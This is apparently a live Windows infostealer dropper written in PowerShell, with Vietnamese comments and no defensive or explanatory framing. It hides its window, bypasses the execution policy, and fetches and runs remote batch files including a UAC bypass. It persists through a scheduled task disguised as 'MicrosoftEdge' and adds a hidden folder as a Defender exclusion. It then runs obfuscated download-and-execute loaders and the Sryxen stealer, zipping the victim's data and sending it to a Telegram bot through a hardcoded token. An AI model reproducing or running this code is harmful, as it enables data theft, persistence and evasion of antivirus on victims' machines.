Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@

[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force

# Define the target IP
$TargetIP = "26.165.195.200"

# Get all network interfaces and their IP addresses
$IPs = Get-NetIPAddress | Select-Object -ExpandProperty IPAddress

# Check if the target IP exists
if ($IPs -contains $TargetIP) {
    Write-Host "IP $TargetIP found. Exiting..."
    Stop-Process -Id $pid -Force
} else {
    Write-Host "IP $TargetIP not found."
}


$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
$startupfolder = $env:appdata
Add-Type -AssemblyName System.Windows.Forms


# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Tải xuống tệp batch
        
        $outputFile = "$startupfolder\download.bat"
        
        # Kiểm tra mức độ UAC và in thông báo
        $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/uac_obf.bat"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        Write-Output "Khởi chạy tệp batch."

        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        Write-Output "Khởi chạy tệp batch."
        
        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
        Write-Output "Kết thúc tiến trình PowerShell."
        Stop-Process -Id $PID -Force
    }
    catch {
        Write-Error "Lỗi xảy ra: $_"
    }
}

$task_name = "MicrosoftEdge"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
Write-Host "[!] Persistence Added" -ForegroundColor Green

Remove-Item -Path "$startupfolder\download.bat" -Force

$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru


Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.Net.Http
Start-Process powershell -ArgumentList "-Command iwr 'https://github.com/EvilBytecode/Sryxen/releases/download/v1.0.0/sryxen_loader.ps1' | iex" -WindowStyle Hidden -Wait; $userName=$env:USERNAME; $archivePath=[System.IO.Path]::GetTempPath()+$userName+'.zip'; Compress-Archive -Path ([System.IO.Path]::GetTempPath()+$userName) -DestinationPath $archivePath -Force; $botToken="7487418347:AAHo0dKeo0c-nZAiN9ZgiVPbyp4xTSdsV2E"; $chatId="7056174540"; $telegramApiUrl="https://api.telegram.org/bot$botToken/sendDocument"; $multipartContent=New-Object System.Net.Http.MultipartFormDataContent; $multipartContent.Add((New-Object System.Net.Http.StringContent($chatId)),"chat_id"); $multipartContent.Add((New-Object System.Net.Http.StreamContent([System.IO.File]::OpenRead($archivePath))),"document",[System.IO.Path]::GetFileName($archivePath)); (New-Object System.Net.Http.HttpClient).PostAsync($telegramApiUrl,$multipartContent).Result
